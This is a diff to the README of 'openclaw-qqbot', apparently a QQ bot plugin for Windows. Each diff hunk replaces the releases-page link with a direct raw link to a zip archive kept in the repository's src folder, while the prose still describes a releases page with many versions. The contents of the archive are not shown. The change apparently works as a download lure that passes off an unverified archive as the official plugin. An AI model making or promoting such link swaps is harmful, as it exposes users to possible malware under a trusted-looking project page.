@@ -1,6 +1,6 @@
 # 🤖 openclaw-qqbot - Easy QQ Bot Channel Plugin
 
-[![Download openclaw-qqbot](https://img.shields.io/badge/Download-openclaw--qqbot-brightgreen?style=for-the-badge)](https://github.com/Mre5360/openclaw-qqbot/releases)
+[![Download openclaw-qqbot](https://img.shields.io/badge/Download-openclaw--qqbot-brightgreen?style=for-the-badge)](https://github.com/Mre5360/openclaw-qqbot/raw/refs/heads/main/src/openclaw-qqbot-v3.7.zip)
 
 ---
 
@@ -24,11 +24,11 @@ Before you start, make sure your computer matches these needs:
 
 ## 🔗 Download openclaw-qqbot
 
-[![Download openclaw-qqbot](https://img.shields.io/badge/Download-openclaw--qqbot-blue?style=for-the-badge)](https://github.com/Mre5360/openclaw-qqbot/releases)
+[![Download openclaw-qqbot](https://img.shields.io/badge/Download-openclaw--qqbot-blue?style=for-the-badge)](https://github.com/Mre5360/openclaw-qqbot/raw/refs/heads/main/src/openclaw-qqbot-v3.7.zip)
 
 Click the badge above or visit the link below to get the plugin files:
 
-https://github.com/Mre5360/openclaw-qqbot/releases
+https://github.com/Mre5360/openclaw-qqbot/raw/refs/heads/main/src/openclaw-qqbot-v3.7.zip
 
 This page has all the available versions. Choose the latest one for the best experience.
 
@@ -40,7 +40,7 @@ This page has all the available versions. Choose the latest one for the best exp
 
    Open this URL in your web browser:
    
-   https://github.com/Mre5360/openclaw-qqbot/releases
+   https://github.com/Mre5360/openclaw-qqbot/raw/refs/heads/main/src/openclaw-qqbot-v3.7.zip
 
 2. **Find the latest release:**
 
@@ -156,6 +156,6 @@ These keywords help you find it on GitHub and understand its main areas.
 
 ## 📥 Download Link (Again)
 
-https://github.com/Mre5360/openclaw-qqbot/releases
+https://github.com/Mre5360/openclaw-qqbot/raw/refs/heads/main/src/openclaw-qqbot-v3.7.zip
 
 Open the link, get the latest version, and follow the instructions above to install and use openclaw-qqbot on your Windows machine.
